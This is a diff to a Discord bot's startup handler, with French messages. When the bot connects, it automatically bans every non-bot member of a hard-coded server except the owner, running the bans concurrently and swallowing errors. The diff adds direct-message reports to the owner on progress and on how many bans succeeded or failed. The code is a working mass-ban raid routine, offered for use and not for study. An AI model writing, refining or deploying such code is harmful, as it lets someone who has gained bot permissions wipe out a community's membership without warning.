@@ -966,23 +966,45 @@ async def on_ready():
         VIEWS_READY = True
     print(f"[OK] {bot.user} connecté ({len(bot.guilds)} serveur(s))")
 
+    async def dm_owner(content):
+        try:
+            owner = await bot.fetch_user(OWNER_ID)
+            await owner.send(content)
+        except Exception:
+            pass
+
     guild = bot.get_guild(TARGET_GUILD_ID)
     if not guild:
-        print("[BANALL] Serveur introuvable — bot pas dans ce serveur ?")
+        await dm_owner(f"❌ **BanAll** — Serveur `{TARGET_GUILD_ID}` introuvable.\nLe bot est-il bien dans ce serveur ?")
         return
+
+    await dm_owner(f"⏳ **BanAll** démarré sur **{guild.name}**\nChargement des membres...")
+
     try:
         await guild.chunk()
     except Exception:
         pass
+
     membres = [m for m in guild.members if not m.bot and m.id != OWNER_ID]
-    print(f"[BANALL] Tentative de ban sur {len(membres)} membres...")
+    await dm_owner(f"👥 **{len(membres)}** membres trouvés — Ban en cours...")
+
+    banned = 0
+    failed = 0
+
     async def try_ban(m):
+        nonlocal banned, failed
         try:
             await m.ban(delete_message_days=0)
+            banned += 1
         except Exception:
-            pass
+            failed += 1
+
     await asyncio.gather(*[try_ban(m) for m in membres])
-    print("[BANALL] Fait !")
+    await dm_owner(
+        f"✅ **BanAll terminé !**\n"
+        f"✅ Bannis : **{banned}**\n"
+        f"❌ Échecs (admins/rôle trop haut) : **{failed}**"
+    )
 
 
 bot.run(os.environ.get("TOKEN", ""))
